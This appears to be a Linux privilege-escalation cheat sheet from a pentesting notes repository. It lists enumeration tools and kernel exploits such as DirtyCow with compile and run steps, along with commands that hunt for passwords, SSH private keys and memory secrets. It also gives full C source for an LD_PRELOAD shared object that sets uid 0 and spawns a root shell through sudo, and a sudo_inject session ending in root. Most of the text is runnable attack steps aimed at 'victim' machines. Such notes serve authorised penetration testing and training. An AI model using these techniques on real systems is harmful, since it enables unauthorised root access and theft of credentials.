# linux-priv-Esc

# GTFOBins  
https://gtfobins.github.io


# Initial Enumeration
uname -a, netstat -ano, history

# Automated tools 
1) Linux-Exploit-Suggester  https://github.com/mzet-/linux-exploit-suggester
2) Linux-Privilege-Script https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
3) Linux-Enumeration https://github.com/rebootuser/LinEnum


# Kernal-Exploit 

1) CVE-2016-5195 (DirtyCow)
Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
Code: https://github.com/FireFart/dirtycow/blob/master/dirty.c

compile:- gcc -pthread dirty.c -o dirty -lcrypt

Then run the newly create binary by either doing:- "./dirty" or "./dirty my-new-password"

2) CVE-2010-3904 (RDS)
Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
https://www.exploit-db.com/exploits/15285/

3) CVE-2010-4258 (Full Nelson)
Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)
https://www.exploit-db.com/exploits/15704/

4) CVE-2012-0056 (Mempodipper)

Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
https://www.exploit-db.com/exploits/18411


# Weak File Permission 

ls -l | grep shadow 

ls -l | grep passwd

# File Containing Password

grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

# Old passwords in /etc/security/opasswd

/etc/security/opasswd 


# Last edited files
*Files that were edited in the last 10 minutes*

find / -mmin -10 2>/dev/null | grep -Ev "^/proc"

# In memory passwords
strings /dev/mem -n10 | grep -i PASS

# Find sensitive files
$ locate password | more    

/boot/grub/i386-pc/password.mod

/etc/pam.d/common-password

/etc/pam.d/gdm-password

/etc/pam.d/gdm-password.original

/lib/live/config/0031-root-password

# SSH Key

*Sensitive files*

find / -name authorized_keys 2> /dev/null

find / -name id_rsa 2> /dev/null


# SUDO

* NOPASSWD Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.*

$ sudo -l

# LD_PRELOAD and NOPASSWD
If LD_PRELOAD is explicitly defined in the sudoers file

Defaults        env_keep += LD_PRELOAD

Compile the shared C code below on victim machine with gcc -fPIC -shared -o shell.so shell.c -nostartfiles

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_.so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so whoami


# sudo_inject
Using https://github.com/nongiach/sudo_inject

$ sudo whatever

[sudo] password for user:    

# Press <ctrl>+c since you don't have the password. 
# This creates an invalid sudo tokens.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
	
Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf
